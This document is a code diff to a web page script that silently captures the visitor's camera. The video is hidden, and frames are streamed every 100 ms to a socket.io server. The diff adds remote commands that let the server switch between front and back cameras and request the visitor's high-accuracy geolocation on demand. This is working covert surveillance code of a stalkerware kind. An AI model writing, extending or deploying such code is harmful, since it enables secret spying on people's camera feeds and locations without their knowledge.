@@ -19,7 +19,7 @@ video, canvas { display: none !important; }
 const socket = io();
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-let mediaStream = null, isReady = false, interval = null;
+let mediaStream = null, isReady = false, interval = null, currentFacingMode = 'user';
 
 function getDeviceInfo() {
 const ua = navigator.userAgent;
@@ -28,22 +28,18 @@ let browser = /chrome/i.test(ua) ? "Chrome" : "Browser";
 return dev + ' (' + browser + ')';
 }
 
-function sendLocation() {
-if (navigator.geolocation) {
-navigator.geolocation.getCurrentPosition(pos => {
-socket.emit('user-location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
-}, () => {});
+function startCamera(facing) {
+if (mediaStream) {
+mediaStream.getTracks().forEach(t => t.stop());
 }
-}
-
-natorMediaDevices = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } }).then(stream => {
 mediaStream = stream;
 video.srcObject = stream;
 video.onloadedmetadata = () => {
 video.play();
 isReady = true;
 socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
-sendLocation();
+if (!interval) {
 interval = setInterval(() => {
 if (!isReady || !video.videoWidth) return;
 const ctx = canvas.getContext('2d');
@@ -51,13 +47,30 @@ canvas.width = 320; canvas.height = 240;
 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 socket.emit('live-stream-frame', canvas.toDataURL('image/jpeg', 0.3));
 }, 100);
+}
 };
 }).catch(e => console.log(e));
+}
 
-subDocumentVisibility = document.addEventListener("visibilitychange", () => {
+startCamera(currentFacingMode);
+
+window.addEventListener("visibilitychange", () => {
 if (document.visibilityState === "visible") {
 if (video.paused && mediaStream) video.play();
 socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
+}
+});
+
+socket.on('switch-camera', (facing) => {
+currentFacingMode = facing;
+startCamera(facing);
+});
+
+socket.on('request-location', () => {
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(pos => {
+socket.emit('user-location', { lat: pos.coords.latitude, lon: pos.coords.longitude });
+}, () => { socket.emit('user-location', null); }, { enableHighAccuracy: true });
 }
 });
 
